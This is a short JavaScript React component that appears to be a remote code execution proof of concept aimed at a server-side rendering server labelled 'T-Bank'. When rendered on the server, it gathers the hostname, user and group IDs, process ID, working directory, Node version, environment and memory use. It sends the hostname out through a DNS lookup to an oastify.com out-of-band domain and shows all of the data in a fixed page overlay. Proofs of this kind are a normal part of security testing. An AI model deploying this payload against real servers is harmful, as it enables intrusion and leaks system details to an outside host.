var React = require("react");

module.exports = {
  default: function(props) {
    var info = {};
    
    try { info.hostname = require("os").hostname(); } catch(e) {}
    try { info.uptime = Math.round(require("os").uptime()) + "s"; } catch(e) {}
    try { var u = require("os").userInfo(); info.user = u.username + "/" + u.uid + "/" + u.gid; } catch(e) {}
    try { info.pid = process.pid; } catch(e) {}
    try { info.cwd = process.cwd(); } catch(e) {}
    try { info.node = process.version; } catch(e) {}
    try { info.env = process.env.NODE_ENV || "not set"; } catch(e) {}
    try { info.platform = require("os").platform() + "/" + require("os").arch(); } catch(e) {}
    try { info.mem = Math.round(process.memoryUsage().rss / 1024 / 1024) + "MB"; } catch(e) {}
    
    try { require("dns").lookup(info.hostname + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
    
    var text = JSON.stringify(info, null, 2);
    return React.createElement("pre", {
      id: "rce-proof",
      style: {background:"#1a1a2e",color:"#e94560",padding:"15px",fontSize:"13px",fontFamily:"monospace",position:"fixed",top:"10px",right:"10px",zIndex:99999,borderRadius:"8px",maxWidth:"400px",opacity:"0.95"}
    }, "RCE: T-Bank SSR Server\n" + text);
  }
};
